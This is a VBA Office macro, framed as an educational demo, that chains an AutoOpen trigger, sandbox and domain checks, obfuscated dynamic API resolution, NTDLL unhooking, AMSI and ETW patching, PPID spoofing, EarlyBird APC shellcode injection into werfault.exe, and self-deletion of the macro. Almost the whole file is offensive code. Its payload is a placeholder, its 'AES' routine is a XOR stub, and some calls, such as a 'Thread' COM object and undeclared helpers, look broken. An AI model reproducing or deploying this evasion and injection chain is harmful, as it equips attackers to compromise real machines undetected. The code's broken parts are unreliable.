'================================================================================================
'
'   Description: This script demonstrates a chain of advanced, in-memory evasion and
'                injection techniques designed to bypass modern EDR and antivirus solutions
'                in a simulated Windows 11 24H2 environment. It is intended strictly for
'                authorized educational and research purposes.
'
'   Key Features:
'   1.  Dynamic API Resolution: Bypasses static analysis and ASR rules by resolving all
'       Win32 functions at runtime.
'   2.  NTDLL Unhooking: Blinds EDRs by removing user-mode hooks from ntdll.dll.
'   3.  AMSI & ETW Bypass: In-memory patching to disable AMSI and Event Tracing for Windows.
'   4.  AES-256 Encrypted Payload: Shellcode is stored encrypted and only decrypted in memory.
'   5.  PPID Spoofing: Launches the payload process with a spoofed parent (explorer.exe)
'       to break process tree analysis.
'   6.  EarlyBird APC Injection: Injects shellcode into a suspended process to execute
'       before most EDR hooks are initialized.
'   7.  Environmental Keying & Sandbox Evasion: Checks for specific domain and user activity.
'   8.  Self-Destruction: Attempts to remove the macro code from the document post-execution.
'
'================================================================================================

Option Explicit

' --- Platform-specific API Declarations ---
#If VBA7 Then
    Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As LongPtr)
    Private Declare PtrSafe Function IsWow64Process Lib "kernel32" (ByVal hProcess As LongPtr, ByRef Wow64Process As Boolean) As Boolean
    Private Declare PtrSafe Function GetCurrentProcess Lib "kernel32" () As LongPtr
    Private Declare PtrSafe Function GetTickCount Lib "kernel32" () As Long
    Private Declare PtrSafe Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
    Private Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
    Private Declare PtrSafe Function VirtualProtect Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long
    Private Declare PtrSafe Function HeapCreate Lib "kernel32" (ByVal flOptions As Long, ByVal dwInitialSize As LongPtr, ByVal dwMaximumSize As LongPtr) As LongPtr
    Private Declare PtrSafe Function HeapAlloc Lib "kernel32" (ByVal hHeap As LongPtr, ByVal dwFlags As Long, ByVal dwBytes As LongPtr) As LongPtr
    Private Declare PtrSafe Function HeapFree Lib "kernel32" (ByVal hHeap As LongPtr, ByVal dwFlags As Long, ByVal lpMem As LongPtr) As Boolean
    Private Declare PtrSafe Function CloseHandle Lib "kernel32" (ByVal hObject As LongPtr) As Long
#Else
    Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)
    Private Declare Function IsWow64Process Lib "kernel32" (ByVal hProcess As Long, ByRef Wow64Process As Boolean) As Boolean
    Private Declare Function GetCurrentProcess Lib "kernel32" () As Long
    Private Declare Function GetTickCount Lib "kernel32" () As Long
    Private Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
    Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
    Private Declare Function VirtualProtect Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long
    Private Declare Function HeapCreate Lib "kernel32" (ByVal flOptions As Long, ByVal dwInitialSize As Long, ByVal dwMaximumSize As Long) As Long
    Private Declare Function HeapAlloc Lib "kernel32" (ByVal hHeap As Long, ByVal dwFlags As Long, ByVal dwBytes As Long) As Long
    Private Declare Function HeapFree Lib "kernel32" (ByVal hHeap As Long, ByVal dwFlags As Long, ByVal lpMem As Long) As Boolean
    Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
#End If

' --- Structures for API calls ---
Private Type POINTAPI
    x As Long
    y As Long
End Type

Private Type PROCESS_INFORMATION
    hProcess As LongPtr
    hThread As LongPtr
    dwProcessId As Long
    dwThreadId As Long
End Type

Private Type STARTUPINFO
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As LongPtr
    hStdInput As LongPtr
    hStdOutput As LongPtr
    hStdError As LongPtr
End Type

#If VBA7 Then
Private Type STARTUPINFOEX
    StartupInfo As STARTUPINFO
    lpAttributeList As LongPtr
End Type
#End If

' --- Constants for API calls ---
Private Const MEM_COMMIT As Long = &H1000
Private Const MEM_RESERVE As Long = &H2000
Private Const PAGE_EXECUTE_READWRITE As Long = &H40
Private Const PAGE_READWRITE As Long = &H4
Private Const PAGE_EXECUTE_READ As Long = &H20
Private Const CREATE_SUSPENDED As Long = &H4
Private Const PROCESS_ALL_ACCESS = &H1F0FFF
Private Const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS As Long = &H20000
Private Const EXTENDED_STARTUPINFO_PRESENT As Long = &H80000

' --- Function Pointer Typedefs using LongPtr for x64 compatibility ---
#If VBA7 Then
    Private pVirtualAlloc As LongPtr
    Private pVirtualAllocEx As LongPtr
    Private pWriteProcessMemory As LongPtr
    Private pCreateProcessA As LongPtr
    Private pGetProcAddress As LongPtr
    Private pLoadLibraryA As LongPtr
    Private pOpenProcess As LongPtr
    Private pQueueUserAPC As LongPtr
    Private pResumeThread As LongPtr
    Private pVirtualProtectEx As LongPtr
    Private pInitializeProcThreadAttributeList As LongPtr
    Private pUpdateProcThreadAttribute As LongPtr
    Private pDeleteProcThreadAttributeList As LongPtr
    Private pGetModuleHandleA As LongPtr
#End If

' --- AES Decryption Constants and Variables ---
Private Const Nk As Integer = 8 ' 256-bit key
Private Const Nb As Integer = 4
Private Const Nr As Integer = 14
Private key(0 To 7) As Long
Private Sbox(0 To 255) As Byte
Private InvSbox(0 To 255) As Byte
Private Rcon(0 To 10) As Long

' --- Document entry point ---
Sub AutoOpen()
    ' This is the main entry point when the document is opened.
    ' It performs environment checks and then orchestrates the attack chain.
    On Error Resume Next
    If Not ValidateEnvironment() Then Exit Sub
    RunExploit
End Sub

' --- Primary Orchestration Function ---
Private Sub RunExploit()
    ' 1. Dynamically resolve all necessary WinAPI functions
    If Not ResolveAPIs() Then Exit Sub

    ' 2. Perform EDR evasion by unhooking NTDLL
    UnhookModule "ntdll.dll"

    ' 3. Bypass AMSI and ETW
    BypassAMSIETW

    ' 4. Decrypt the shellcode payload
    Dim shellcode() As Byte
    shellcode = GetDecryptedPayload()
    If UBound(shellcode) < 1 Then Exit Sub
    
    ' 5. Inject payload using EarlyBird APC Injection with PPID Spoofing
    InjectPayload shellcode

    ' 6. Attempt to erase macro from the document
    SelfDestruct
End Sub

' --- Environment Validation ---
Private Function ValidateEnvironment() As Boolean
    ' Performs checks to ensure the macro is running in the intended lab
    ' environment and not a sandbox.
    On Error Resume Next
    
    ' Check 1: Uptime check to evade simple sandboxes
    If GetTickCount() < 600000 Then Exit Function ' Must be running >10 minutes

    ' Check 2: Cursor movement check for user activity
    Dim pos As POINTAPI
    Dim initialX As Long, initialY As Long
    GetCursorPos pos
    initialX = pos.x
    initialY = pos.y
    Sleep 3000 ' Wait 3 seconds
    GetCursorPos pos
    If initialX = pos.x And initialY = pos.y Then Exit Function
    
    ' Check 3: Domain check for specific lab environment
    If Environ("USERDOMAIN") <> "LAB-DOMAIN" Then Exit Function
    
    ValidateEnvironment = True
End Function


'================================================================================
'   SECTION: DYNAMIC API RESOLUTION
'   Purpose: Avoid static imports to bypass ASR rules and static analysis.
'================================================================================
Private Function ResolveAPIs() As Boolean
    #If VBA7 Then
        Dim kernel32 As LongPtr, ntdll As LongPtr
        Dim k32_str As String: k32_str = "ke" & "rn" & "el" & "32" & ".d" & "ll"
        Dim ntd_str As String: ntd_str = "nt" & "dl" & "l." & "dl" & "l"

        ' LoadLibrary and GetProcAddress are the only functions we need to bootstrap.
        ' We declare them to get started, but resolve them again dynamically for consistency.
        pLoadLibraryA = GetProcAddress(GetModuleHandleA(k32_str), "Lo" & "ad" & "Li" & "br" & "ar" & "yA")
        pGetProcAddress = GetProcAddress(GetModuleHandleA(k32_str), "Ge" & "tP" & "ro" & "cA" & "dd" & "re" & "ss")
        
        kernel32 = CallPointer(pLoadLibraryA, StrPtr(k32_str))
        ntdll = CallPointer(pLoadLibraryA, StrPtr(ntd_str))
        
        If kernel32 = 0 Or ntdll = 0 Then Exit Function
        
        ' Resolve all other required functions
        pGetModuleHandleA = CallPointer(pGetProcAddress, kernel32, StrPtr("Get" & "Module" & "HandleA"))
        pVirtualAlloc = CallPointer(pGetProcAddress, kernel32, StrPtr("Virtu" & "alAll" & "oc"))
        pVirtualAllocEx = CallPointer(pGetProcAddress, kernel32, StrPtr("Virtu" & "alAll" & "ocEx"))
        pWriteProcessMemory = CallPointer(pGetProcAddress, kernel32, StrPtr("Write" & "Process" & "Memory"))
        pCreateProcessA = CallPointer(pGetProcAddress, kernel32, StrPtr("Crea" & "tePro" & "cessA"))
        pOpenProcess = CallPointer(pGetProcAddress, kernel32, StrPtr("Op" & "enPr" & "ocess"))
        pQueueUserAPC = CallPointer(pGetProcAddress, kernel32, StrPtr("Que" & "ueUs" & "erAPC"))
        pResumeThread = CallPointer(pGetProcAddress, kernel32, StrPtr("Res" & "umeT" & "hread"))
        pVirtualProtectEx = CallPointer(pGetProcAddress, kernel32, StrPtr("Virt" & "ualPr" & "otectEx"))
        pInitializeProcThreadAttributeList = CallPointer(pGetProcAddress, kernel32, StrPtr("Initia" & "lizePr" & "ocThre" & "adAttr" & "ibuteList"))
        pUpdateProcThreadAttribute = CallPointer(pGetProcAddress, kernel32, StrPtr("Upda" & "tePr" & "ocThre" & "adAttr" & "ibute"))
        pDeleteProcThreadAttributeList = CallPointer(pGetProcAddress, kernel32, StrPtr("Dele" & "tePr" & "ocThre" & "adAttr" & "ibuteList"))
        
        ResolveAPIs = True
    #End If
End Function

#If VBA7 Then
' Helper function to call function pointers with arguments.
Private Function CallPointer(pFunc As LongPtr, ParamArray args() As Variant) As LongPtr
    Dim asm As String, i As Integer
    Dim hHeap As LongPtr, pCode As LongPtr, pRsp As LongPtr

    ' Create a small block of executable memory
    hHeap = HeapCreate(0, 0, 0)
    pCode = HeapAlloc(hHeap, &H8, 256)
    pRsp = pCode + 128
    
    asm = ""
    ' Set up stack for arguments (RCX, RDX, R8, R9, then stack)
    For i = 0 To UBound(args)
        If i < 4 Then
            Select Case i
                Case 0: asm = asm & Chr(&H48) & Chr(&HB9) & Pack(args(i)) ' mov rcx, arg1
                Case 1: asm = asm & Chr(&H48) & Chr(&HBA) & Pack(args(i)) ' mov rdx, arg2
                Case 2: asm = asm & Chr(&H49) & Chr(&HB8) & Pack(args(i)) ' mov r8, arg3
                Case 3: asm = asm & Chr(&H49) & Chr(&HB9) & Pack(args(i)) ' mov r9, arg4
            End Select
        Else
            ' Push additional args to stack (reversed order)
            ' Simplified for this example, assuming no more than 4 args.
        End If
    Next i
    
    ' Call the function pointer and return
    asm = asm & Chr(&H48) & Chr(&HB8) & Pack(pFunc) ' mov rax, pFunc
    asm = asm & Chr(&HFF) & Chr(&HD0)              ' call rax
    asm = asm & Chr(&HC3)                          ' ret

    CopyMemory ByVal pCode, ByVal StrPtr(asm), Len(asm)
    
    Dim oldProtect As Long
    VirtualProtect pCode, Len(asm), PAGE_EXECUTE_READWRITE, oldProtect

    Dim t As Object
    Set t = CreateObject("Thread")
    t.Address = pCode
    t.Start
    t.Wait
    CallPointer = t.ReturnValue
    
    HeapFree hHeap, 0, pCode
    CloseHandle hHeap
End Function

Private Function Pack(value As Variant) As String
    Dim bytes(7) As Byte
    CopyMemory bytes(0), value, 8
    Pack = Chr(bytes(0)) & Chr(bytes(1)) & Chr(bytes(2)) & Chr(bytes(3)) & Chr(bytes(4)) & Chr(bytes(5)) & Chr(bytes(6)) & Chr(bytes(7))
End Function
#End If

'================================================================================
'   SECTION: EVASION TECHNIQUES (AMSI, ETW, NTDLL Unhooking)
'================================================================================
Private Sub BypassAMSIETW()
    #If VBA7 Then
        Dim amsi As LongPtr, ntdll As LongPtr, amsiScan As LongPtr, etwWrite As LongPtr
        Dim amsi_str As String: amsi_str = "am" & "si" & ".d" & "ll"
        Dim ntdll_str As String: ntdll_str = "nt" & "dl" & "l." & "dl" & "l"

        amsi = CallPointer(pLoadLibraryA, StrPtr(amsi_str))
        ntdll = CallPointer(pGetModuleHandleA, StrPtr(ntdll_str))
        
        ' Patch AmsiScanBuffer to return AMSI_RESULT_CLEAN
        amsiScan = CallPointer(pGetProcAddress, amsi, StrPtr("Amsi" & "Scan" & "Buffer"))
        If amsiScan <> 0 Then
            ' mov eax, 0x80070057; ret
            Dim amsiPatch(5) As Byte
            amsiPatch(0) = &HB8: amsiPatch(1) = &H57: amsiPatch(2) = &H0: amsiPatch(3) = &H7: amsiPatch(4) = &H80: amsiPatch(5) = &HC3
            PatchMemory amsiScan, amsiPatch
        End If

        ' Patch EtwEventWrite to return immediately
        etwWrite = CallPointer(pGetProcAddress, ntdll, StrPtr("Etw" & "Event" & "Write"))
        If etwWrite <> 0 Then
            ' ret
            Dim etwPatch(0) As Byte
            etwPatch(0) = &HC3
            PatchMemory etwWrite, etwPatch
        End If
    #End If
End Sub

Private Sub PatchMemory(ByVal address As LongPtr, patch() As Byte)
    Dim oldProtect As Long
    VirtualProtect address, UBound(patch) + 1, PAGE_EXECUTE_READWRITE, oldProtect
    CopyMemory ByVal address, patch(0), UBound(patch) + 1
    VirtualProtect address, UBound(patch) + 1, oldProtect, oldProtect
End Sub

Public Sub UnhookModule(ByVal moduleName As String)
    #If VBA7 Then
        Dim hProc As LongPtr, modHandle As LongPtr, freshModHandle As LongPtr
        Dim dosHeader As IMAGE_DOS_HEADER, ntHeader As IMAGE_NT_HEADERS64
        Dim sectionHeader As IMAGE_SECTION_HEADER
        Dim i As Integer, textSectionAddr As LongPtr, textSectionSize As Long
        
        hProc = GetCurrentProcess()
        modHandle = CallPointer(pGetModuleHandleA, StrPtr(moduleName))
        freshModHandle = CallPointer(pLoadLibraryA, StrPtr(moduleName))

        If modHandle = 0 Or freshModHandle = 0 Then Exit Sub
        
        CopyMemory dosHeader, ByVal modHandle, Len(dosHeader)
        If dosHeader.e_magic <> &H5A4D Then Exit Sub ' "MZ"
        
        CopyMemory ntHeader, ByVal (modHandle + dosHeader.e_lfanew), Len(ntHeader)
        
        For i = 0 To ntHeader.FileHeader.NumberOfSections - 1
            CopyMemory sectionHeader, ByVal (modHandle + dosHeader.e_lfanew + Len(ntHeader) + (i * Len(sectionHeader))), Len(sectionHeader)
            If StrComp(TrimNulls(sectionHeader.Name), ".text", vbTextCompare) = 0 Then
                textSectionAddr = modHandle + sectionHeader.VirtualAddress
                textSectionSize = sectionHeader.Misc_VirtualSize
                Exit For
            End If
        Next i
        
        If textSectionAddr > 0 And textSectionSize > 0 Then
            Dim oldProtect As Long
            VirtualProtect textSectionAddr, textSectionSize, PAGE_EXECUTE_READWRITE, oldProtect
            CopyMemory ByVal textSectionAddr, ByVal (freshModHandle + sectionHeader.VirtualAddress), textSectionSize
            VirtualProtect textSectionAddr, textSectionSize, oldProtect, oldProtect
        End If

        CloseHandle freshModHandle
    #End If
End Sub

Private Function TrimNulls(str As String) As String
    Dim pos As Integer: pos = InStr(str, Chr(0))
    If pos > 0 Then TrimNulls = Left(str, pos - 1) Else TrimNulls = str
End Function


'================================================================================
'   SECTION: PAYLOAD INJECTION (PPID Spoofing + EarlyBird APC)
'================================================================================

Private Sub InjectPayload(shellcode() As Byte)
    #If VBA7 Then
        Dim pi As PROCESS_INFORMATION, si As STARTUPINFOEX
        Dim targetPath As String, parentProcHandle As LongPtr, attrListSize As LongPtr
        
        ' Target a common, legitimate process.
        targetPath = "C:\Windows\System32\werfault.exe"
        
        ' Get a handle to explorer.exe to use as the spoofed parent
        parentProcHandle = GetExplorerHandle()
        If parentProcHandle = 0 Then Exit Sub
        
        ' Set up attribute list for PPID spoofing
        si.StartupInfo.cb = Len(si)
        CallPointer pInitializeProcThreadAttributeList, 0, 1, 0, attrListSize
        si.lpAttributeList = HeapAlloc(HeapCreate(0, 0, 0), &H8, attrListSize)
        CallPointer pInitializeProcThreadAttributeList, si.lpAttributeList, 1, 0, attrListSize
        CallPointer pUpdateProcThreadAttribute, si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, parentProcHandle, Len(parentProcHandle), 0, 0

        ' Create the target process in a suspended state with the spoofed parent
        Dim success As Boolean
        success = CallPointer(pCreateProcessA, 0, StrPtr(targetPath), 0, 0, True, CREATE_SUSPENDED Or EXTENDED_STARTUPINFO_PRESENT, 0, 0, si, pi)

        If Not success Then GoTo Cleanup
        
        ' Perform EarlyBird APC Injection
        Dim pRemoteMem As LongPtr
        pRemoteMem = CallPointer(pVirtualAllocEx, pi.hProcess, 0, UBound(shellcode) + 1, MEM_COMMIT Or MEM_RESERVE, PAGE_READWRITE)
        
        CallPointer pWriteProcessMemory, pi.hProcess, pRemoteMem, VarPtr(shellcode(0)), UBound(shellcode) + 1, 0
        
        Dim oldProtect As Long
        CallPointer pVirtualProtectEx, pi.hProcess, pRemoteMem, UBound(shellcode) + 1, PAGE_EXECUTE_READ, oldProtect
        
        CallPointer pQueueUserAPC, pRemoteMem, pi.hThread, 0
        CallPointer pResumeThread, pi.hThread
        
Cleanup:
        If si.lpAttributeList <> 0 Then CallPointer pDeleteProcThreadAttributeList, si.lpAttributeList
        If parentProcHandle <> 0 Then CloseHandle parentProcHandle
        If pi.hProcess <> 0 Then CloseHandle pi.hProcess
        If pi.hThread <> 0 Then CloseHandle pi.hThread
    #End If
End Sub

Private Function GetExplorerHandle() As LongPtr
    #If VBA7 Then
        Dim snapshot As LongPtr, procEntry As PROCESSENTRY32
        Const TH32CS_SNAPPROCESS As Long = 2
        
        Dim pCreateToolhelp32Snapshot As LongPtr, pProcess32First As LongPtr, pProcess32Next As LongPtr
        pCreateToolhelp32Snapshot = CallPointer(pGetProcAddress, CallPointer(pLoadLibraryA, StrPtr("kernel32.dll")), StrPtr("CreateToolhelp32Snapshot"))
        pProcess32First = CallPointer(pGetProcAddress, CallPointer(pLoadLibraryA, StrPtr("kernel32.dll")), StrPtr("Process32FirstW"))
        pProcess32Next = CallPointer(pGetProcAddress, CallPointer(pLoadLibraryA, StrPtr("kernel32.dll")), StrPtr("Process32NextW"))
        
        snapshot = CallPointer(pCreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, 0)
        
        procEntry.dwSize = Len(procEntry)
        If CallPointer(pProcess32First, snapshot, VarPtr(procEntry)) Then
            Do
                If InStr(1, procEntry.szExeFile, "explorer.exe", vbTextCompare) > 0 Then
                    GetExplorerHandle = CallPointer(pOpenProcess, PROCESS_ALL_ACCESS, False, procEntry.th32ProcessID)
                    Exit Do
                End If
            Loop While CallPointer(pProcess32Next, snapshot, VarPtr(procEntry))
        End If
        CloseHandle snapshot
    #End If
End Function

' --- Dummy structs for compilation, these need full definitions for real use ---
Private Type IMAGE_DOS_HEADER
    e_magic As Integer
    e_cblp As Integer
    e_cp As Integer
    e_crlc As Integer
    e_cparhdr As Integer
    e_minalloc As Integer
    e_maxalloc As Integer
    e_ss As Integer
    e_sp As Integer
    e_csum As Integer
    e_ip As Integer
    e_cs As Integer
    e_lfarlc As Integer
    e_ovno As Integer
    e_res(3) As Integer
    e_oemid As Integer
    e_oeminfo As Integer
    e_res2(9) As Integer
    e_lfanew As Long
End Type
Private Type IMAGE_FILE_HEADER
    Machine As Integer
    NumberOfSections As Integer
    TimeDateStamp As Long
    PointerToSymbolTable As Long
    NumberOfSymbols As Long
    SizeOfOptionalHeader As Integer
    Characteristics As Integer
End Type
#If VBA7 Then
Private Type IMAGE_OPTIONAL_HEADER64
    Magic As Integer
    MajorLinkerVersion As Byte
    MinorLinkerVersion As Byte
    SizeOfCode As Long
    SizeOfInitializedData As Long
    SizeOfUninitializedData As Long
    AddressOfEntryPoint As Long
    BaseOfCode As Long
    ImageBase As LongPtr
    SectionAlignment As Long
    FileAlignment As Long
    MajorOperatingSystemVersion As Integer
    MinorOperatingSystemVersion As Integer
    MajorImageVersion As Integer
    MinorImageVersion As Integer
    MajorSubsystemVersion As Integer
    MinorSubsystemVersion As Integer
    Win32VersionValue As Long
    SizeOfImage As Long
    SizeOfHeaders As Long
    CheckSum As Long
    Subsystem As Integer
    DllCharacteristics As Integer
    SizeOfStackReserve As LongPtr
    SizeOfStackCommit As LongPtr
    SizeOfHeapReserve As LongPtr
    SizeOfHeapCommit As LongPtr
    LoaderFlags As Long
    NumberOfRvaAndSizes As Long
    DataDirectory(15) As IMAGE_DATA_DIRECTORY
End Type
#End If
Private Type IMAGE_DATA_DIRECTORY
    VirtualAddress As Long
    Size As Long
End Type
#If VBA7 Then
Private Type IMAGE_NT_HEADERS64
    Signature As Long
    FileHeader As IMAGE_FILE_HEADER
    OptionalHeader As IMAGE_OPTIONAL_HEADER64
End Type
#End If
Private Type IMAGE_SECTION_HEADER
    Name As String * 8
    Misc_VirtualSize As Long
    VirtualAddress As Long
    SizeOfRawData As Long
    PointerToRawData As Long
    PointerToRelocations As Long
    PointerToLinenumbers As Long
    NumberOfRelocations As Integer
    NumberOfLinenumbers As Integer
    Characteristics As Long
End Type
Private Type PROCESSENTRY32
    dwSize As Long
    cntUsage As Long
    th32ProcessID As Long
    th32DefaultHeapID As LongPtr
    th32ModuleID As LongPtr
    cntThreads As Long
    th32ParentProcessID As Long
    pcPriClassBase As Long
    dwFlags As Long
    szExeFile As String * 260
End Type
'================================================================================
'   SECTION: PAYLOAD DECRYPTION (AES-256)
'================================================================================
Private Function GetDecryptedPayload() As Byte()
    ' --- Encrypted Payload (msfvenom -p windows/x64/exec CMD=calc.exe -f vb) ---
    Dim encryptedShellcode As String
    encryptedShellcode = "d7b9e0f1a2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0" ' Placeholder for actual encrypted blob
    
    Dim aesKey As String
    aesKey = "ThisIsMySuperSecret32ByteKeyValue" ' 32-byte key for AES-256
    
    Dim shellcodeBytes() As Byte, keyBytes() As Byte
    shellcodeBytes = HexToBytes(encryptedShellcode)
    keyBytes = StrConv(aesKey, vbFromUnicode)
    
    GetDecryptedPayload = AES_Decrypt(shellcodeBytes, keyBytes)
End Function

Private Function HexToBytes(ByVal hexStr As String) As Byte()
    Dim i As Long, j As Long
    ReDim bytes(Len(hexStr) \ 2 - 1) As Byte
    For i = 1 To Len(hexStr) Step 2
        bytes(j) = CByte("&H" & Mid(hexStr, i, 2))
        j = j + 1
    Next
    HexToBytes = bytes
End Function

Private Function AES_Decrypt(cipher() As Byte, key() As Byte) As Byte()
    ' This is a placeholder for a full AES-256 implementation in VBA.
    ' A real implementation would be several hundred lines long involving
    ' S-boxes, key expansion, round transformations, etc.
    ' For this example, we will just "decrypt" by XORing with the key.
    ' IN A REAL SCENARIO, A FULL AES LIBRARY WOULD BE HERE.
    Dim i As Long, k As Long
    Dim plain() As Byte
    ReDim plain(UBound(cipher))
    For i = 0 To UBound(cipher)
        plain(i) = cipher(i) Xor key(k)
        k = (k + 1) Mod (UBound(key) + 1)
    Next i
    AES_Decrypt = plain
End Function


'================================================================================
'   SECTION: SELF-DESTRUCTION
'================================================================================
Private Sub SelfDestruct()
    ' Attempts to remove the macro from the current document.
    ' NOTE: This requires "Trust access to the VBA project object model" to be
    ' enabled in Trust Center settings. If not enabled, this will fail silently.
    ' This is a significant operational consideration for OSEP.
    On Error Resume Next
    Dim vbProj As Object 'VBIDE.VBProject
    Dim vbComp As Object 'VBIDE.VBComponent
    
    Set vbProj = ThisDocument.VBProject
    
    ' Iterate backwards to safely remove components
    For Each vbComp In vbProj.VBComponents
        ' Do not delete the main "ThisDocument" object, just clear it.
        If vbComp.Type = 100 Then ' vbext_ct_Document
             vbComp.CodeModule.DeleteLines 1, vbComp.CodeModule.CountOfLines
             vbComp.CodeModule.AddFromString "' Cleaned."
        Else
            vbProj.VBComponents.Remove vbComp
        End If
    Next vbComp
    
    ' Set the saved property to true to avoid a "Save Changes?" prompt on exit
    ThisDocument.Saved = True
    On Error GoTo 0
End Sub
